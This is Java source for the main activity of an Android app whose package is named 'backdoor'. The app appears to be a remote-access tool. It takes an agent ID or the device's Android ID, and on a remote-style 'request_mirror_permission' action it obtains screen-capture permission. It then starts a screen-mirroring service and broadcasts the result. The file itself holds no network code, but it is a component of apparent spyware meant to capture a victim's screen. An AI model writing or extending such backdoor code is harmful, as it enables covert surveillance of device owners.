package com.lazyframework.backdoor;

import static android.app.Activity.RESULT_OK;

import android.app.Activity;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MainActivity";
    private static final int SCREEN_RECORD_REQUEST_CODE = 9999;
    
    private MediaProjectionManager mediaProjectionManager;
    private Handler mainHandler;
    private String agentId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Optional: set a minimal layout, atau langsung handle intent
        // setContentView(R.layout.activity_main);
        
        mainHandler = new Handler(Looper.getMainLooper());
        
        Log.d(TAG, "✅ MainActivity onCreate");
        
        // Get system service
        mediaProjectionManager = (MediaProjectionManager) getSystemService(
                android.content.Context.MEDIA_PROJECTION_SERVICE);

        // Get agent ID from intent
        Intent intent = getIntent();
        agentId = intent.getStringExtra("agent_id");
        if (agentId == null) {
            agentId = android.provider.Settings.Secure.getString(
                    getContentResolver(),
                    android.provider.Settings.Secure.ANDROID_ID
            );
        }
        
        String action = intent.getStringExtra("action");
        
        if ("request_mirror_permission".equals(action)) {
            Log.d(TAG, "🎥 Requesting screen recording permission...");
            requestScreenRecordingPermission();
        } else {
            Log.d(TAG, "No special action, finishing");
            finish();
        }
    }

    // ==================== REQUEST PERMISSION ====================

    private void requestScreenRecordingPermission() {
        try {
            if (mediaProjectionManager == null) {
                Log.e(TAG, "❌ MediaProjectionManager is null");
                notifyPermissionResult(false, "MediaProjectionManager not available");
                finish();
                return;
            }

            // Request screen recording permission
            Intent intent = mediaProjectionManager.createScreenCaptureIntent();
            Log.d(TAG, "📋 Starting activity for result...");
            startActivityForResult(intent, SCREEN_RECORD_REQUEST_CODE);
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error requesting permission: " + e.getMessage(), e);
            notifyPermissionResult(false, "Error: " + e.getMessage());
            finish();
        }
    }

    // ==================== HANDLE PERMISSION RESULT ====================

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        Log.d(TAG, "📊 onActivityResult - requestCode: " + requestCode + 
              ", resultCode: " + resultCode);

        if (requestCode == SCREEN_RECORD_REQUEST_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                // ✅ PERMISSION GRANTED
                Log.d(TAG, "✅ User granted screen recording permission!");
                
                Toast.makeText(this, "Permission granted! Starting mirror...", 
                        Toast.LENGTH_SHORT).show();
                
                // Pass hasil permission ke ScreenMirrorService
                startScreenMirrorService(resultCode, data);
                
                // Notify result
                notifyPermissionResult(true, "Permission granted");
                
            } else {
                // ❌ PERMISSION DENIED
                Log.w(TAG, "❌ User denied screen recording permission");
                Toast.makeText(this, "Permission denied!", Toast.LENGTH_SHORT).show();
                
                notifyPermissionResult(false, "Permission denied by user");
            }
            
            // Close MainActivity setelah selesai
            mainHandler.postDelayed(this::finish, 500);
        }
    }

    // ==================== START SCREEN MIRROR SERVICE ====================

    private void startScreenMirrorService(int resultCode, Intent data) {
        try {
            Intent serviceIntent = new Intent(this, ScreenMirrorService.class);
            
            // Pass hasil permission ke service
            serviceIntent.putExtra("action", "START_MIRROR");
            serviceIntent.putExtra("media_projection_result", resultCode);
            serviceIntent.putExtra("media_projection_data", data);
            serviceIntent.putExtra("agent_id", agentId);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            
            Log.d(TAG, "📡 ScreenMirrorService started");
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error starting ScreenMirrorService: " + e.getMessage(), e);
        }
    }

    // ==================== NOTIFY RESULT ====================

    private void notifyPermissionResult(boolean success, String message) {
        try {
            Intent resultIntent = new Intent("com.lazyframework.MIRROR_PERMISSION_RESULT");
            resultIntent.putExtra("success", success);
            resultIntent.putExtra("message", message);
            resultIntent.putExtra("agent_id", agentId);
            sendBroadcast(resultIntent);
            
            Log.d(TAG, "📡 Permission result broadcast sent: " + success);
            
        } catch (Exception e) {
            Log.e(TAG, "Broadcast error: " + e.getMessage());
        }
    }

    // ==================== LIFECYCLE ====================

    @Override
    protected void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "MainActivity destroyed");
    }
}
